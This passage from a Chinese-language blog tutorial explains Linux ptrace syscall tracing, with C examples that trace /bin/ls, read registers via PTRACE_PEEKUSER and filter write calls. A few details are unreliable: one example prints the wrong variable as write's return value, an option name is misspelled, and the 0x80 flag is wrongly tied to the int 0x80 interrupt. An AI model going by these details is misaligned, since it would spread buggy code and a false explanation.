class="type">long</span> <span class="type">long</span> <span class="type">int</span> eflags;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ss;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ds;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> es;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">user</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">user_regs_struct</span>   regs;</span><br><span class="line">  <span class="comment">// other fields</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user结构体第一个字段就是所有寄存器的信息struct user_regs_struct   regs;</p><p>这个结构体里面都是unsigned long long int类型的成员。我们再结合ptrace系统调用看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orig_rax = ptrace(PTRACE_PEEKUSER, child, <span class="number">8</span> * ORIG_RAX, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p><code>addr</code>字段我们传的是<code>8 * ORIG_RAX</code>，其中<code>8</code>代表每个成员的大小（long long int在64位系统中所占用的大小），而<code>ORIG_RAX(15)</code>刚好对应在<code>user_regs_struct</code>字段中的<code>orig_rax</code>成员。</p><p>这个成员在执行完execve系统调用后，存着的就是系统调用号。</p><hr><h4 id="1-6-3-3-Traced状态——入门例子"><a href="#1-6-3-3-Traced状态——入门例子" class="headerlink" title="1.6.3.3 Traced状态——入门例子"></a>1.6.3.3 Traced状态——入门例子</h4><p>在上面的版本的demo中，我们已经能够理解父子进程中使用ptrace能做到的一些事情了。我们在上面的demo跟着参考文章进行一些改进。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">pid_t</span> child;</span><br><span class="line"><span class="type">long</span> orig_rax;</span><br><span class="line">child=fork();</span><br><span class="line">    <span class="type">int</span> status=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Origen signal %d !Got signal %d\n&quot;</span>,status,WSTOPSIG(status));</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            orig_rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Program called system call: %ld\n&quot;</span>, orig_rax);</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关宏的设置是这样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIFEXITED(status)    (((status) &amp; 0xff) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFSTOPPED(status)   (((status) &amp; 0xff) == 0x7f)</span></span><br></pre></td></tr></table></figure><p>这里涉及到的新东西有以下几个。</p><ol><li>wait(&amp;status);</li><li>ptrace(PTRACE_SYSCALL, child, NULL, NULL);</li><li>父进程的调用是在一个死循环里</li></ol><p>运行结果如下所示</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725531833655-06cbd253-9b05-4082-a266-3f368db9af93.png" alt="img"></p><hr><h5 id="1-6-3-3-1-wait-status-以及相关宏"><a href="#1-6-3-3-1-wait-status-以及相关宏" class="headerlink" title="1.6.3.3.1 wait(&amp;status)以及相关宏"></a>1.6.3.3.1 wait(&amp;status)以及相关宏</h5><p>上面讲wait函数的时候提到过，这时候会关心子进程返回的信号类型，也就是说会接收子进程来的信号。</p><p>接收到信号之后，WSTOPSIG宏可以获取信号对应的编号，具体编号可以用kill -l指令展现出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">qwq@qwq:~/ctf$ kill -l</span><br><span class="line"> <span class="number">1</span>) SIGHUP <span class="number">2</span>) SIGINT <span class="number">3</span>) SIGQUIT <span class="number">4</span>) SIGILL <span class="number">5</span>) SIGTRAP</span><br><span class="line"> <span class="number">6</span>) SIGABRT <span class="number">7</span>) SIGBUS <span class="number">8</span>) SIGFPE <span class="number">9</span>) SIGKILL<span class="number">10</span>) SIGUSR1</span><br><span class="line"><span class="number">11</span>) SIGSEGV<span class="number">12</span>) SIGUSR2<span class="number">13</span>) SIGPIPE<span class="number">14</span>) SIGALRM<span class="number">15</span>) SIGTERM</span><br><span class="line"><span class="number">16</span>) SIGSTKFLT<span class="number">17</span>) SIGCHLD<span class="number">18</span>) SIGCONT<span class="number">19</span>) SIGSTOP<span class="number">20</span>) SIGTSTP</span><br><span class="line"><span class="number">21</span>) SIGTTIN<span class="number">22</span>) SIGTTOU<span class="number">23</span>) SIGURG<span class="number">24</span>) SIGXCPU<span class="number">25</span>) SIGXFSZ</span><br><span class="line"><span class="number">26</span>) SIGVTALRM<span class="number">27</span>) SIGPROF<span class="number">28</span>) SIGWINCH<span class="number">29</span>) SIGIO<span class="number">30</span>) SIGPWR</span><br><span class="line"><span class="number">31</span>) SIGSYS<span class="number">34</span>) SIGRTMIN<span class="number">35</span>) SIGRTMIN+<span class="number">1</span><span class="number">36</span>) SIGRTMIN+<span class="number">2</span><span class="number">37</span>) SIGRTMIN+<span class="number">3</span></span><br><span class="line"><span class="number">38</span>) SIGRTMIN+<span class="number">4</span><span class="number">39</span>) SIGRTMIN+<span class="number">5</span><span class="number">40</span>) SIGRTMIN+<span class="number">6</span><span class="number">41</span>) SIGRTMIN+<span class="number">7</span><span class="number">42</span>) SIGRTMIN+<span class="number">8</span></span><br><span class="line"><span class="number">43</span>) SIGRTMIN+<span class="number">9</span><span class="number">44</span>) SIGRTMIN+<span class="number">10</span><span class="number">45</span>) SIGRTMIN+<span class="number">11</span><span class="number">46</span>) SIGRTMIN+<span class="number">12</span><span class="number">47</span>) SIGRTMIN+<span class="number">13</span></span><br><span class="line"><span class="number">48</span>) SIGRTMIN+<span class="number">14</span><span class="number">49</span>) SIGRTMIN+<span class="number">15</span><span class="number">50</span>) SIGRTMAX<span class="number">-14</span><span class="number">51</span>) SIGRTMAX<span class="number">-13</span><span class="number">52</span>) SIGRTMAX<span class="number">-12</span></span><br><span class="line"><span class="number">53</span>) SIGRTMAX<span class="number">-11</span><span class="number">54</span>) SIGRTMAX<span class="number">-10</span><span class="number">55</span>) SIGRTMAX<span class="number">-9</span><span class="number">56</span>) SIGRTMAX<span class="number">-8</span><span class="number">57</span>) SIGRTMAX<span class="number">-7</span></span><br><span class="line"><span class="number">58</span>) SIGRTMAX<span class="number">-6</span><span class="number">59</span>) SIGRTMAX<span class="number">-5</span><span class="number">60</span>) SIGRTMAX<span class="number">-4</span><span class="number">61</span>) SIGRTMAX<span class="number">-3</span><span class="number">62</span>) SIGRTMAX<span class="number">-2</span></span><br><span class="line"><span class="number">63</span>) SIGRTMAX<span class="number">-1</span><span class="number">64</span>) SIGRTMAX</span><br></pre></td></tr></table></figure><p>WIFEXITED宏可以检测接收到的型号是否标志着子进程退出，其宏定义为。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># in sys/wait.h</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> WIFEXITED(status)  __WIFEXITED (__WAIT_INT (status))</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># in bits/waitstatus.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __WIFEXITED(status) (__WTERMSIG(status) == 0)</span></span><br></pre></td></tr></table></figure><p>也就是说，如果接收到的信号编号为<code>0</code>，就意味着子进程退出。</p><hr><p>子进程什么时候会向父进程发送信号？</p><p>目前情况是syscall的时候会向父进程发一次</p><hr><h5 id="1-6-3-3-2-PTRACE-SYSCALL与while循环"><a href="#1-6-3-3-2-PTRACE-SYSCALL与while循环" class="headerlink" title="1.6.3.3.2 PTRACE_SYSCALL与while循环"></a>1.6.3.3.2 PTRACE_SYSCALL与while循环</h5><p>照搬上面的解释</p><p>形式：ptrace(PTRACE_SYS, pid, 0, signal)<br>描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。<strong>与PTRACE_CONT不同的是进行系统调用跟踪</strong>。在被跟踪进程继续运行直到调用系统调用开始或结束时，被跟踪进程被中止，并通知父进程。</p><p>PTRACE_SYSCALL与PTRACE_CONT有如下的关系</p><p>与<code>PTRACE_CONT</code>功能类似，使子进程继续执行，其最后一个参数也和<code>PTRACE_CONT</code>一样，表示是否发送相应信号给子进程。</p><p>发生systemcall相关的事件（包括systemcall开始和systemcall结束）时子进程需要通知父进程。<strong>要注意的是每次子进程被暂停后都需要重新调用PTRACE_SYSCALL以便下一次的system call事件会被捕抓到。</strong></p><p>根据<code>PTRACE_SYSCALL</code>的功能描述，我们通过一个<code>while</code>循环体来接收子进程每一次<code>system call</code>发出的信号，并在处理完成后再次通过<code>PTRACE_SYSCALL</code>来捕获下一次<code>system call</code>的信号，并当子进程退出时结束循环。</p><hr><h5 id="1-6-3-3-3-运行结果解析"><a href="#1-6-3-3-3-运行结果解析" class="headerlink" title="1.6.3.3.3 运行结果解析"></a>1.6.3.3.3 运行结果解析</h5><p>运行结果打印出来的都是三个东西</p><p>Origen signal 1407 !Got signal 5</p><p>Program called system call: 59</p><p>其中上面的1407和5也就是signal信号都是全部一致的</p><p>一开始就出现了59号的系统调用，这是因为调用了execve</p><p>之后则是12&#x2F;158&#x2F;9&#x2F;21&#x2F;257&#x2F;3&#x2F;0&#x2F;262&#x2F;10&#x2F;17&#x2F;218&#x2F;137&#x2F;318&#x2F;202&#x2F;191&#x2F;41……</p><p>除了一开始的59，<strong>其他的系统调用都是重复出现的。这是因为PTRACE_SYSCALL会让子进程在每次系统调用进入和退出的时候都发出信号。</strong></p><p>父进程<code>wait</code>系统调用每次接收到的信号都是<code>5）SIGTRAP</code>。</p><hr><h4 id="1-6-3-4-Traced状态——进阶例子"><a href="#1-6-3-4-Traced状态——进阶例子" class="headerlink" title="1.6.3.4 Traced状态——进阶例子"></a>1.6.3.4 Traced状态——进阶例子</h4><h5 id="1-6-3-4-1-过滤execve的框架"><a href="#1-6-3-4-1-过滤execve的框架" class="headerlink" title="1.6.3.4.1 过滤execve的框架"></a>1.6.3.4.1 过滤execve的框架</h5><p>往往tracee进程都会通过ptrace+execve的方式将自身转变为一个处于中止状态的进程，而tracer进程往往会通过wait系统调用来接收由tracee进程发出的SIGTRAP信号。因此在这种场景下，第一个信号一定是对应execve这个系统调用的，而并不是我们想要追踪的进程的系统调用，因此我们忽略这个信号。</p><p>所以下面的代码有一个空的死循环，我们还没写进去code，我们先在死循环接受第一个信号execve</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">  <span class="type">pid_t</span> child = fork();</span><br><span class="line">  <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">  <span class="type">long</span> orig_rax = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (child == <span class="number">0</span>)&#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    execl(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="comment">// code block</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着是ptrace的系统调用，通过PTRACE_SYSCALL选项通知tracee进程的所有系统调用的信号给父进程然后再进入循环体。前面我们提到过tracee进程发送的有关系统调用的信号是成对出现的。其中有一个系统调用号1，也就是sys-write值得我们关注。我们可以看到write系统调用是打印出ls的结果的关键。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Origen signal <span class="number">1407</span> !Got signal <span class="number">5</span></span><br><span class="line">Program called system call: <span class="number">1</span></span><br><span class="line">-rwx--x--x  <span class="number">1</span> qwq qwq  17K  <span class="number">7</span>月 <span class="number">18</span> <span class="number">17</span>:<span class="number">27</span> vuln</span><br><span class="line">Origen signal <span class="number">1407</span> !Got signal <span class="number">5</span></span><br><span class="line">Program called system call: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>我们结合控制台输出来解释下程序当时的行为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program called system call: <span class="number">1</span>：程序开始调用write系统调用，准备向控制台写入数据；</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">1.9</span>K <span class="number">8</span>月 <span class="number">28</span> <span class="number">17</span>:<span class="number">00</span> monitor_signal.c：程序写入数据；</span><br><span class="line">Program called system call: <span class="number">1</span>：程序退出write系统调用。</span><br></pre></td></tr></table></figure><h5 id="1-6-3-4-2-优化代码"><a href="#1-6-3-4-2-优化代码" class="headerlink" title="1.6.3.4.2 优化代码"></a>1.6.3.4.2 优化代码</h5><p>所以我们也可以充分利用PTRACE_SYSCALL的特性，将程序开始进行系统调用和结束系统调用的相关信息打印出来？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/reg.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">long orig_rax;</span><br><span class="line">pid_t child=fork();</span><br><span class="line">    <span class="built_in">int</span> status=<span class="number">0</span>;</span><br><span class="line">    long rax=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> insyscall=<span class="number">0</span>;</span><br><span class="line">    long params[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,NULL,NULL);</span><br><span class="line">        execl(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            orig_rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,NULL);</span><br><span class="line">            <span class="keyword">if</span>(orig_rax != SYS_write)&#123;</span><br><span class="line">ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(<span class="string">&quot;Got signal %d\n&quot;</span>,WSTOPSIG(status));</span><br><span class="line">/*Syscall entry*/</span><br><span class="line"><span class="keyword">if</span>(insyscall==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">insyscall=<span class="number">1</span>;</span><br><span class="line">params[<span class="number">0</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDI,NULL);</span><br><span class="line">params[<span class="number">1</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RSI,NULL);</span><br><span class="line">params[<span class="number">2</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDX,NULL);</span><br><span class="line">printf(<span class="string">&quot;write called with %ld,%ld,%ld\n&quot;</span>,params[<span class="number">0</span>],params[<span class="number">1</span>],params[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">params[<span class="number">0</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RAX,NULL);</span><br><span class="line">printf(<span class="string">&quot;Write returned with %ld\n&quot;</span>,rax);</span><br><span class="line">insyscall=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相比之前的代码，这份代码有两部分的优化，第一个过滤掉除write的系统调用，第二个显示write系统调用的参数和返回值。</p><p>只捕抓write系统调用的实现：过滤掉第一个execve的系统调用之后，再次等待子进程的信号,syscall会向父进程发送信号，可以用PEEKUSER获取的rax值（其作为系统调用号）。</p><p>分别处理系统调用的进入和退出：系统调用是成对出现的。因此捕抓到write系统调用的时候，我们通过一个insyscall变量来表示这个系统调用是“进入”状态还是“退出”状态。</p><p>显示<code>write</code>系统调用入参情况：我们可以从<code>ORIG_RAX</code>这个寄存器中获取系统调用号，通过同样的方式，我们可以通过<code>RDI</code>、<code>RSI</code>和<code>RDX</code>寄存器分别获取系统调用的第1、2、3个参数。</p><p>实际上，Linux为64位机器提供了6个保存参数的寄存器，按照顺序他们分别是：RDI、RSI、RDX、RCX、R8和R9。</p><p>显示<code>write</code>系统调用返回值：当<code>insyscall</code>变量为<code>1</code>时，说明程序已经进入系统调用，接下来的一次系统调用行为就是退出系统调用。这时，我们通过获取<code>RAX</code>寄存器中的值，可以获取系统调用的返回值。</p><p><code>ORIG_RAX</code>寄存器保存系统调用号，<code>RAX</code>寄存器保存系统调用返回值。</p><h5 id="1-6-3-4-3-为什么子进程信号一直是5）SIGTRAP"><a href="#1-6-3-4-3-为什么子进程信号一直是5）SIGTRAP" class="headerlink" title="1.6.3.4.3 为什么子进程信号一直是5）SIGTRAP"></a>1.6.3.4.3 为什么子进程信号一直是5）SIGTRAP</h5><p>在入门版本的输出中，输出的<code>Got signal</code>内容一直都是<code>5</code>这个信号，也就是<code>SIGTRAP</code>。</p><p>这个型号只能告诉tracer进程：tracee进程现在处于中止状态，等待tracer进程对其进行控制，而并不能告诉tracer进程到底是什么原因导致tracee进程进入中止状态的。</p><p>ptrace系统调用我们提供了判别方式：通过PTRACE_SETOPTIONS操作传递PTRACE_0_TRACESYSGOOD给tracee进程，从而让tracee进程发送给tracer进程的信号编号（signal code）由5也就是SIGTRAP 编程5|0x80，也就是133.</p><p>如果返回值是133，那么其就属于系统调用发出的信号。</p><p>0x80是操作系统规定属于系统调用的中断号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/reg.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">pid_t child=fork();</span><br><span class="line">long orig_rax=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> status=<span class="number">0</span>;</span><br><span class="line">    long rax=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> insyscall=<span class="number">0</span>;</span><br><span class="line">    long params[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>(child==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME,<span class="number">0</span>,NULL,NULL);</span><br><span class="line">        execl(<span class="string">&quot;/bin/ls&quot;</span>,<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-h&quot;</span>,NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    ptrace(PTRACE_SETOPTIONS, child, <span class="number">0</span>, PTRACE_O_TRACESYSGOOD);</span><br><span class="line">    ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line">    //puts(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            //puts(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(WIFEXITED(status)) <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (! (WSTOPSIG(status) &amp; <span class="number">0x80</span>)) </span><br><span class="line">            &#123;</span><br><span class="line">ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">            